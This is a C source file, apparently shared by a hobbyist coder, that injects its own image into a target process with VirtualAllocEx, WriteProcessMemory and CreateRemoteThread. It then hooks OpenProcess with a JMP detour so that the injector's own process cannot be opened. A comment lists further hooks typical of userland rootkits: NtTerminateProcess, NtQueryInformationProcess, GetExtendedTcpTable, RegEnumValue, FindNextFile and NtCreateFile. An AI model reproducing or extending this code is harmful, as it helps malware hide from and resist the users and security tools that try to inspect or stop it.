
/*

+ uncHook method , simple hook method using detour to detour the function by a jump opcode .. 
the way it's works : 
	1- allocate space in the target memory and get the base of it
	2- preform a base relocation on the bytes of this process 
	 which containing the hook installing function and all the functions we need , by using the new base 
	3- write the relocated bytes on the target memory
	4- Creating a remote thread , which starts the hook install function

[#] Coded by : UNC0DER
[#] Email    : UNCODERSC@GMAIL(.)COM
[#] Site     : W W W . DPCODERS . C O M

*/

DWORD FuncAddr    = NULL ;  // To hold the api address 
DWORD MyFuncAddr  = NULL ;  // To hold the new function address
DWORD OldProtect  = NULL ;  // To hold the old protection of the api memory
char  OldBytes[5] = {0}  ;  // To hold the old first 5 bytes of the api memory

BOOL BaseRelocation(LPVOID CodeBase,DWORD newBase)
{

	// Get the IMAGE_NT_HEADERS 
	PIMAGE_NT_HEADERS PNH = (PIMAGE_NT_HEADERS)(  ((PIMAGE_DOS_HEADER)CodeBase)->e_lfanew  +  (DWORD)CodeBase   );

	// Calculating the delta to add it to the addresses
	DWORD delta = newBase - PNH->OptionalHeader.ImageBase;

	// Get relocation table entry virtual address 
	DWORD dwVa = (DWORD)PNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	// Get the IMAGE_BASE_RELOCATION ( first block of relocation table ) 
	PIMAGE_BASE_RELOCATION PBR = (PIMAGE_BASE_RELOCATION)(   (DWORD)CodeBase + dwVa   );
	// while blocks not end
	while(PBR->VirtualAddress > 0)
	{
		
			// get current block info address ( the end of the block )
			WORD* blockinf = (WORD*)(  (char*)PBR + sizeof(IMAGE_BASE_RELOCATION)   );
			// get the begining of the block address
			DWORD dest     = (DWORD)(  (DWORD)CodeBase + PBR->VirtualAddress   );

			// the block relocations 
			for(int i = 0 ; i < (PBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; i++)
			{

				int type,offset;

				// get the type of the block (  upper 4 bits )
				type = blockinf[i] >> 12;
				// get the offset of the block ( lower 12 bits )
				offset = blockinf[i] & 0xfff;

				// if the type is IMAGE_REL_BASED_HIGHLOW then relocate the address
				if (type == IMAGE_REL_BASED_HIGHLOW)
				{
					
					// get the address to relocate
					DWORD* AddrLoc = (DWORD*)(   dest + offset   );
					// add the delta to the address
					*AddrLoc += delta;

				} else { break; }

			}

			// set the next block begining
			PBR = (PIMAGE_BASE_RELOCATION)(   (char*)PBR + PBR->SizeOfBlock   );
	}

	// setting the new imagebase
	PNH->OptionalHeader.ImageBase = newBase;

	return TRUE;

}

BOOL PerformHook(DWORD PID,LPVOID HookInstall)
{

	// Getting this module address and copy its bytes to new space
	PVOID hModule           = (PVOID)GetModuleHandleA(NULL)                                                      ;

	// intalize structures and data
	PIMAGE_NT_HEADERS PNH   = (PIMAGE_NT_HEADERS)(   ( (PIMAGE_DOS_HEADER) hModule)->e_lfanew + (DWORD)hModule)  ;
	DWORD CurrImageBase     = PNH->OptionalHeader.ImageBase                                                      ;
	DWORD ImageSize         = PNH->OptionalHeader.SizeOfImage                                                    ;

	// Open process and allocate space 
	HANDLE hProcess         = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID)                                          ;

	if(!hProcess)
		return FALSE;

	DWORD NwImageBase       = (DWORD)VirtualAllocEx(hProcess,0,ImageSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)      ;

	// Copy module bytes to New address
	PVOID NwAddress         = (PVOID)VirtualAlloc(0,ImageSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)                 ;
	CopyMemory(NwAddress,hModule,ImageSize)                                                                      ;

	// Base relocation to the new imagebase if diffrent 
	if (CurrImageBase != NwImageBase)
		BaseRelocation(NwAddress,NwImageBase)                                                                    ;

	// Write the relocated bytes to the process memory 
	WriteProcessMemory(hProcess,(LPVOID)NwImageBase,NwAddress,ImageSize,NULL)                                    ;

	// calc the new address for hook install function and call it using remote thread 
	DWORD NwHookInstall = (DWORD)HookInstall - CurrImageBase + NwImageBase                                       ;
	CreateRemoteThread(hProcess,0,0,(LPTHREAD_START_ROUTINE)NwHookInstall,NULL,NULL,NULL)                        ;

	return TRUE;
}

void ChangeProtect(bool resetOldProtect)
{
	if (resetOldProtect)
	{
		// reset the old protect of the api address memory ( first 5 bytes )
		VirtualProtect((LPVOID)FuncAddr,5,OldProtect,NULL)                      ;
	}
	else
	{
		// change the protect of the api address memory ( first 5 bytes ) to PAGE_EXECUTE_READWRITE
		VirtualProtect((LPVOID)FuncAddr,5,PAGE_EXECUTE_READWRITE,&OldProtect)   ;
	}
}

void RestoreBytes()
{
	ChangeProtect(false)                                                     ;  // chane the api memory protection to PAGE_EXECUTE_READWRITE
	memcpy((LPVOID)FuncAddr,OldBytes,5)                                      ;  // Write the old bytes on the first 5 bytes of the api memory
	ChangeProtect(true)                                                      ;  // restore the old protection
}

void CreateJmp()
{
	char  JMP[5]   = {0xE9,0x00,0x00,0x00,0x00}          ;  // JMP 00 00 00 00 
	DWORD JmpSize  = MyFuncAddr - (DWORD)FuncAddr - 5    ;  // Calculating the jmp size from ( api address to the new function )

	ChangeProtect(false)                                 ;  // Change the api first 5 bytes protection to PAGE_EXECTURE_READWRITE

	memcpy(&OldBytes,(LPVOID)FuncAddr,5)                 ;  // Backup the first 5 bytes before writing the jump
	memcpy(&JMP[1],&JmpSize,4)                           ;  // Insert the jmp size into the JMP byte array ( JMP [00 00 00 00] )
	memcpy((LPVOID)FuncAddr,JMP,5)                       ;  // Write the jump on the first 5 bytes of the api memory

	ChangeProtect(true)                                  ;  // Restore the old protection
}




// ================================================= the new function which the hook detour the api to =============================== //
typedef HANDLE (WINAPI *_MyOpenProcess)(
  _In_  DWORD dwDesiredAccess,
  _In_  BOOL bInheritHandle,
  _In_  DWORD dwProcessId
);


HANDLE MyOpenProcess(
  _In_  DWORD dwDesiredAccess,
  _In_  BOOL bInheritHandle,
  _In_  DWORD dwProcessId
)
{
	_MyOpenProcess Func = (_MyOpenProcess)FuncAddr;

	RestoreBytes();

	HANDLE ret = 0;

	if (dwProcessId != MyID)
		ret = Func(dwDesiredAccess,bInheritHandle,dwProcessId);

	CreateJmp();

	return ret;
}



// setting the new and old api address
DWORD __stdcall HookInstallFunc(LPVOID Param)
{

	FuncAddr   = (DWORD)GetProcAddress(LoadLibraryA("kernel32"),"OpenProcess")	 ;   // API Address to hook
	MyFuncAddr = (DWORD)MyOpenProcess                                            ;   // Func to detour to
	CreateJmp()                                                                  ;   // Create the jmp to MyFuncAddr

	/* do another hooks .. .> 
	  # NtOpenProcess
	  # NtTerminateProcess
	  # GetExtendedTcpTable
	  # NtQueryInformationProcess
	  # RegEnumValue
	  # FindNextFile
	  # NtCreateFile
	   ... Etc ...
	*/

	
	ExitThread(0)                                                                ;   // End the thread
}